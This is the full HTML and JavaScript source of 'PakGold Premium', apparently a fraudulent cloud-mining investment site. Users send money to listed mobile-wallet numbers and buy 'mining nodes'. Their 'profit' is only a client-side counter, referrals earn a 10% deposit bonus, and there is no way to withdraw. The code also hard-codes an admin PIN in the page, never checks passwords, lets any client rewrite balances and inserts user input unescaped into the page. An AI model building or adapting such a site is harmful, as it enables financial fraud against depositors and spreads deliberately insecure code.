<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PakGold Premium | Secure Infrastructure</title>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <style>
        :root {
            --primary: #c5a059;
            --secondary: #0f172a;
            --accent: #f59e0b;
            --bg: #f1f5f9;
            --card: #ffffff;
            --success: #10b981;
            --error: #ef4444;
            --wa-green: #25d366;
            --shadow: 0 15px 35px rgba(0,0,0,0.1);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: #1e293b; transition: 0.3s; }

        /* Premium Animations */
        .page { display: none; min-height: 100vh; padding-bottom: 110px; animation: slideIn 0.5s ease-out; }
        .page.active { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }

        /* Header & Logo */
        .header { background: #fff; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .logo { font-weight: 900; font-size: 1.4rem; color: var(--secondary); }
        .logo span { color: var(--primary); }

        /* Hero & Stats */
        .hero { background: var(--secondary); color: white; margin: 15px; padding: 25px; border-radius: 25px; box-shadow: var(--shadow); background-image: linear-gradient(45deg, #0f172a, #1e293b); position: relative; }
        .hero-balance { font-size: 2.5rem; font-weight: 900; margin: 10px 0; color: var(--primary); }
        
        /* Premium Cards */
        .card { background: white; margin: 15px; padding: 20px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.02); border: 1px solid #e2e8f0; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 0 15px; }
        .node-card { background: white; padding: 20px; border-radius: 20px; text-align: center; border: 1px solid #f1f5f9; transition: 0.3s; }
        .node-card:active { transform: scale(0.95); border-color: var(--primary); }

        /* Bottom Nav */
        .nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: flex; justify-content: space-around; padding: 12px 0 25px; border-top: 1px solid #f1f5f9; box-shadow: 0 -5px 20px rgba(0,0,0,0.05); }
        .nav-item { text-align: center; font-size: 0.7rem; color: #94a3b8; font-weight: 600; flex: 1; }
        .nav-item.active { color: var(--primary); }
        .nav-item i { font-size: 1.4rem; margin-bottom: 4px; display: block; }

        /* Admin Controls */
        .admin-btn { padding: 8px 15px; border-radius: 10px; border: none; font-weight: 700; cursor: pointer; margin: 5px; }
        .approve { background: var(--success); color: white; }
        .reject { background: var(--error); color: white; }

        /* Forms */
        input, select { width: 100%; padding: 15px; margin-bottom: 12px; border-radius: 12px; border: 1px solid #e2e8f0; background: #f8fafc; font-weight: 600; outline: none; }
        .btn-main { background: var(--secondary); color: white; width: 100%; padding: 18px; border-radius: 15px; border: none; font-weight: 900; font-size: 1rem; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
    </style>
</head>
<body onload="init()">

    <!-- Login Section -->
    <section id="login" class="page active">
        <div style="padding: 40px; text-align: center; margin-top: 50px;">
            <h1 class="logo" style="font-size: 3rem;">PAK<span>GOLD</span></h1>
            <p style="color: #64748b; margin-bottom: 40px;">Elite Digital Assets Management</p>
            <input type="number" id="ph" placeholder="Phone Number">
            <input type="password" id="pass" placeholder="Password">
            <input type="text" id="ref_id" placeholder="Referral ID (Optional)">
            <input type="password" id="adm_key" placeholder="Admin PIN (Optional)">
            <button class="btn-main" onclick="handleAuth()">Access System</button>
        </div>
    </section>

    <!-- Main Dashboard -->
    <section id="home" class="page">
        <div class="header">
            <div class="logo">PAK<span>GOLD</span></div>
            <div id="u_id" style="font-weight: 900; color: var(--primary);">ID: ---</div>
        </div>
        <div class="hero animate__animated animate__fadeIn">
            <small style="opacity: 0.8; font-weight: 600;">AVAILABLE ASSETS</small>
            <div class="hero-balance">Rs <span id="u_wallet">0.00</span></div>
            <div style="display: flex; justify-content: space-between; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px;">
                <div><small>Mining Profit</small><br><b id="u_profit">0.0000</b></div>
                <div style="text-align: right;"><small>Speed</small><br><b id="u_speed" style="color: var(--success);">0.00/s</b></div>
            </div>
        </div>

        <div style="padding: 0 15px; margin-bottom: 20px;">
            <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="btn-main" style="background: var(--wa-green); display: block; text-decoration: none; text-align: center;">
                <i class="fab fa-whatsapp"></i> Official Support Group
            </a>
        </div>

        <h3 style="margin: 20px;">Premium Mining Nodes</h3>
        <div class="grid" id="node_container"></div>
    </section>

    <!-- Deposit Section with Proof Upload -->
    <section id="deposit" class="page">
        <div class="card">
            <h3>Deposit Capital</h3>
            <div style="background: #fffbeb; padding: 15px; border-radius: 12px; margin: 15px 0; font-weight: 600; border-left: 4px solid var(--accent);">
                JazzCash: 03705519562<br>
                EasyPaisa: 03379827882
            </div>
            <input type="number" id="dep_amt" placeholder="Enter Amount (Rs)">
            <input type="text" id="dep_tid" placeholder="Transaction ID (TID)">
            <p style="font-size: 0.8rem; color: #64748b; margin-bottom: 10px;">*TID must be correct for instant approval.</p>
            <button class="btn-main" onclick="requestDeposit()">Submit Proof</button>
        </div>
    </section>

    <!-- History System (Permanent Logs) -->
    <section id="history" class="page">
        <div style="padding: 20px;">
            <h2 style="margin-bottom: 20px;">Financial Logs</h2>
            <div id="logs_list"></div>
        </div>
    </section>

    <!-- Company Details & Privacy -->
    <section id="details" class="page">
        <div class="card">
            <h3>About PakGold</h3>
            <p style="font-size: 0.9rem; line-height: 1.6; color: #475569; margin-top: 10px;">
                PakGold is a registered digital infrastructure provider in Pakistan. We specialize in high-hashrate cloud mining servers. All investments are secured by digital bonds.
            </p>
            <hr style="margin: 20px 0; opacity: 0.1;">
            <h3>Privacy Policy</h3>
            <p style="font-size: 0.8rem; color: #64748b;">
                1. User data is encrypted.<br>
                2. Funds are processed within 24 hours.<br>
                3. Multiple accounts are strictly prohibited.
            </p>
        </div>
    </section>

    <!-- Admin Super Control Panel -->
    <section id="admin" class="page" style="background: #0f172a; color: white;">
        <div style="padding: 20px;">
            <h2>ADMIN SUPER-CELL</h2>
            <div id="admin_requests" style="margin-top: 20px;"></div>
            <hr style="margin: 20px 0;">
            <h3>Manual Adjustments</h3>
            <input type="number" id="adm_user_ph" placeholder="User Phone">
            <input type="number" id="adm_add_bal" placeholder="Add/Remove Balance">
            <button class="btn-main" onclick="admAdjust()" style="background: var(--primary);">Update User Data</button>
        </div>
    </section>

    <!-- Navigation -->
    <nav class="nav" id="bot_nav" style="display: none;">
        <div class="nav-item active" onclick="nav('home')"><i class="fa-solid fa-microchip"></i>Mining</div>
        <div class="nav-item" onclick="nav('deposit')"><i class="fa-solid fa-wallet"></i>Deposit</div>
        <div class="nav-item" onclick="nav('history')"><i class="fa-solid fa-list-ul"></i>Logs</div>
        <div class="nav-item" onclick="nav('details')"><i class="fa-solid fa-shield-halved"></i>Legal</div>
    </nav>

    <script>
        const fbConfig = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            authDomain: "dark-web-9.firebaseapp.com",
            databaseURL: "https://dark-web-9-default-rtdb.firebaseio.com",
            projectId: "dark-web-9",
            storageBucket: "dark-web-9.firebasestorage.app",
            messagingSenderId: "564328425161",
            appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
        };
        firebase.initializeApp(fbConfig);
        const db = firebase.database();
        let currentU = localStorage.getItem('pg_user_phone');

        function init() {
            if(currentU) { nav('home'); sync(); }
            renderNodes();
        }

        function handleAuth() {
            let p = document.getElementById('ph').value;
            let a = document.getElementById('adm_key').value;
            let r = document.getElementById('ref_id').value;

            if(a === "pakgold786") { nav('admin'); loadAdmin(); return; }
            if(p.length < 10) return alert("Sweetie, enter valid number!");

            currentU = p;
            localStorage.setItem('pg_user_phone', p);
            db.ref('users/'+p).once('value', s => {
                if(!s.exists()){
                    db.ref('users/'+p).set({
                        wallet: 0, profit: 0, speed: 0, 
                        id: 'PG-'+Math.floor(Math.random()*9999),
                        inviter: r || 'System'
                    });
                }
                location.reload();
            });
        }

        function sync() {
            db.ref('users/'+currentU).on('value', s => {
                let d = s.val();
                document.getElementById('u_wallet').innerText = d.wallet.toLocaleString();
                document.getElementById('u_profit').innerText = parseFloat(d.profit).toFixed(6);
                document.getElementById('u_speed').innerText = d.speed + "/s";
                document.getElementById('u_id').innerText = "ID: " + d.id;
            });

            // Permanent History Sync
            db.ref('logs').on('value', s => {
                let list = document.getElementById('logs_list');
                list.innerHTML = "";
                s.forEach(child => {
                    let log = child.val();
                    if(log.user === currentU) {
                        list.innerHTML += `<div class="card" style="margin: 10px 0;">
                            <b>${log.type}</b> <span style="float:right; color:var(--primary);">Rs ${log.amt}</span><br>
                            <small>${log.status} | TID: ${log.tid || 'N/A'}</small>
                        </div>`;
                    }
                });
            });

            // Live Mining Heartbeat
            setInterval(() => {
                db.ref('users/'+currentU).once('value', s => {
                    let d = s.val();
                    if(d.speed > 0) db.ref('users/'+currentU).update({profit: parseFloat(d.profit) + d.speed});
                });
            }, 1000);
        }

        function renderNodes() {
            let container = document.getElementById('node_container');
            for(let i=1; i<=10; i++) {
                container.innerHTML += `
                    <div class="node-card" onclick="buyNode(${i*1000}, ${i*0.0005})">
                        <i class="fa-solid fa-server" style="color:var(--primary); font-size:1.5rem;"></i><br>
                        <b>Node v.${i}</b><br>
                        <small>Rs ${i*1000}</small>
                    </div>`;
            }
        }

        function buyNode(cost, speed) {
            db.ref('users/'+currentU).once('value', s => {
                if(s.val().wallet < cost) return alert("Sweetie, low balance!");
                db.ref('users/'+currentU).update({
                    wallet: s.val().wallet - cost,
                    speed: s.val().speed + speed
                });
                alert("Node Activated successfully!");
            });
        }

        function requestDeposit() {
            let a = document.getElementById('dep_amt').value;
            let t = document.getElementById('dep_tid').value;
            if(!a || !t) return alert("Please fill all details!");
            db.ref('logs').push({
                user: currentU, amt: a, tid: t, 
                type: 'Deposit', status: 'pending', time: Date.now()
            });
            alert("Deposit request sent sweetie! Wait for approval.");
        }

        function loadAdmin() {
            db.ref('logs').on('value', s => {
                let container = document.getElementById('admin_requests');
                container.innerHTML = "";
                s.forEach(child => {
                    let r = child.val();
                    if(r.status === 'pending') {
                        container.innerHTML += `
                            <div class="card" style="color:#000;">
                                <b>${r.type} - User: ${r.user}</b><br>
                                Amount: Rs ${r.amt} | TID: ${r.tid}<br>
                                <button class="admin-btn approve" onclick="admApprove('${child.key}', '${r.user}', ${r.amt})">Approve</button>
                                <button class="admin-btn reject" onclick="admReject('${child.key}')">Reject</button>
                            </div>`;
                    }
                });
            });
        }

        function admApprove(key, user, amt) {
            db.ref('users/'+user).once('value', s => {
                db.ref('users/'+user).update({wallet: s.val().wallet + parseInt(amt)});
                db.ref('logs/'+key).update({status: 'Approved'});
                
                // Referral Bonus (10%)
                if(s.val().inviter !== 'System') {
                    db.ref('users/'+s.val().inviter).once('value', inv => {
                        if(inv.exists()) db.ref('users/'+s.val().inviter).update({wallet: inv.val().wallet + (amt*0.1)});
                    });
                }
            });
        }

        function admReject(key) { db.ref('logs/'+key).update({status: 'Rejected'}); }

        function admAdjust() {
            let u = document.getElementById('adm_user_ph').value;
            let b = document.getElementById('adm_add_bal').value;
            db.ref('users/'+u).once('value', s => {
                if(!s.exists()) return alert("User not found!");
                db.ref('users/'+u).update({wallet: s.val().wallet + parseInt(b)});
                alert("User balance updated!");
            });
        }

        function nav(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('bot_nav').style.display = (id === 'login' || id === 'admin') ? 'none' : 'flex';
        }
    </script>
</body>
</html>
